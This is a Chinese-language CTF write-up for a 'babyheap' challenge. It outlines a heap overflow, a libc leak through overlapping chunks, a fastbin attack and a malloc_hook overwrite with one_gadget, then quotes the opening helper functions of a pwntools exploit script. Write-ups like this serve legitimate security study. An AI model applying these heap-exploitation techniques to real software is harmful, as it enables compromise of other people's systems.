## 分析

先简单运行一下程序,发现程序其实和常规的不太一样

```
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 1
Size: 12
Allocate Index 0
```

程序使用 allocate 来创建,同时创建和写入是分开的功能,调试时还有 alarm 函数来干扰我们,我们不多说,扔到 ida 里就是肝,漏洞在这

```
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
```

知道了,我们在 fill 的时候输入不受限制,可以造成堆溢出,进行任意的改写地址大的堆,思路有了
 - 首先通过两个指向相同的堆,造成变相的 uaf 泄漏 libc 基址
 - 恶意修改 fastbin 的 fd ,造成 fastbin attack 指向任意地址
 - 改 malloc_hook 为 one_gadget
 
深入分析一下 [大佬](https://bbs.pediy.com/thread-223461.htm) 的 wp

```
#!/usr/bin/env python
from pwn import *
import sys
#context.log_level = "debug"
elf = "./babyheap"
ENV = {"LD_PRELOAD":"./libc.so.6"}
p = process(elf)

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)

def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()
```
